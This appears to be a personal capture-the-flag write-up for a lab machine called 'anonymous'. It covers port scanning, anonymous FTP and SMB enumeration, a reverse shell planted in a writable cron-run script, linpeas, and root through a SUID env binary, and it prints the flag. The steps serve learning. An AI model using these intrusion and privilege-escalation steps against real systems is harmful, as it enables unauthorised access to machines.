Port scan
```bash
nmap -p- --min-rate=5000 10.10.15.109
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 18:05 EEST
Nmap scan report for 10.10.15.109
Host is up (0.31s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 17.98 seconds
                                                                                                    
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ nmap -p 21,22,139,445 -sC -sV 10.10.15.109     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 18:06 EEST
Nmap scan report for 10.10.15.109
Host is up (0.27s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.25.159
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-08-28T15:06:20
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2025-08-28T15:06:20+00:00
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.64 seconds
```
I didn't see anything interesting in the ftp

```bash
ftp> get clean.sh -
remote: clean.sh
229 Entering Extended Passive Mode (|||19438|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
```
I decided to save this just in case it becomes useful later on

Ok so the smb things are new to me so i have to do research on them.
Apparently it's similar to ftp. Its just a protocol that is used to transfer files over the network.

```bash
smbclient -N -L 10.10.15.109      

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS
```

We are able to read the pics share directory.

```bash
        pics                                                    READ ONLY       My SMB Share Directory for Pics
        ./pics
        dr--r--r--                0 Sun May 17 14:11:34 2020    .
        dr--r--r--                0 Thu May 14 04:59:10 2020    ..
        fr--r--r--            42663 Tue May 12 03:43:42 2020    corgo2.jpg
        fr--r--r--           265188 Tue May 12 03:43:42 2020    puppos.jpeg
```
It has two pictures inside the folder. Not sure how to get them out of there. Nvm it was just the same process as ftp


It seems like its a dead end. I pressed the hint and it told to look further into the ftp and the log file. 

The previous script I saved just in case was able to be edited so i put a bash reverse shell into it.
Then i logged into ftp again and 
append clean.sh clean.sh and then just setup nc and i got the reverse shell succesfully.

```bash
 nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.15.109] 50776
bash: cannot set terminal process group (1823): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ id 
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
namelessone@anonymous:~$ 
```

I was too lazy to start enumerating so I imported linpeas over.

interesting scan findings 
```bash
* * * * * /var/ftp/scripts/clean.sh

╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users             
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env
```

The env has the SUID bit set so we can run it as root.

https://gtfobins.github.io/gtfobins/env/

```bash
SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

    sudo install -m =xs $(which env) .

    ./env /bin/sh -p
```

```bash
namelessone@anonymous:/usr/bin$ ./env /bin/sh -p
./env /bin/sh -p
whoami
root
cat /root/root.txt
4d930091c31a622a7ed10f27999af363
```

This was a fun machine. Not sure what was the point of the smbd but atleast that was something new that I learnt how to use.
